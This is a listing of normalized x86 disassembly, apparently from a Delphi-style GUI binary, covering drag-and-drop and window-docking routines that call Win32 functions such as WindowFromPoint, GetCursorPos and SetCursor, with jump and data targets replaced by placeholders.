movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43b6ec
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43b6ec
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43b7cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43b838
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43bc88
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43ad50
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4446f8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4446f8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4446f8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403468
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43b7cc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4446f8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4446f8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43b9d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4446f8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4446f8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43ba14
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43b22c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43b838
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4139c8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4446f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43b9d0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403468
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_443228
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43b19c
sub_43bb70
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413a24
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4138b8
mov edx edi
mov eax [ rw-data ]
call sub_41386c
jmp r-xdata
sub_43bbd0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43bc28
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40447c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43ad1c
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43bc88
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43bc28
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43bcb4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43ba14
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43bc88
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43bbd0
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4446f8
mov [ esi ] eax
sub_43bd04
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43bbd0
cmp eax 0x1
sbb eax eax
inc eax
sub_43bd40
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_443194
test eax eax
je r-xdata
mov eax esi
call sub_443194
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43c770
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4139c8
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413a24
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_4431a8
mov edi eax
jmp r-xdata
sub_43bdd4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43bcb4
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44621c
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43bd04
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43bd04
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43da08
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43bd04
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c910
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4461d8
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43bd40
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403468
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_446304
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44621c
jmp r-xdata
mov eax [ rw-data ]
call sub_446378
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c910
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43da08
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403468
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403468
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407bf4
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43c0a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43b2d0
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44621c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43bdd4
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43c214
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43c3b9
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403468
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403468
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b5d8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43c0a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b4c0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4446f8
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41256c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43d9dc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_41256c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43c3d8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403468
mov ebx eax
sub_43c44c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43c718
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43c6a6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43b318
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40341c
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43c3d8
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43bd04
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_446378
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c6ad
mov eax [ rw-data ]
call sub_40326c
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_455b0c
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43f0c4
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43bbd0
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_459870
sub_43c6ad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_40326c
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033f8
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
sub_43c73c
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43ad50
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43c770
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43c73c
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43da08
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_441fe4
test eax eax
je r-xdata
mov esi eax
sub_43c7b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41386c
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx ] eax
sub_43c7e0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_413b0c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_40326c
xor eax eax
mov [ ebx ] eax
sub_43c800
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43c830
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413d34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43c8e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
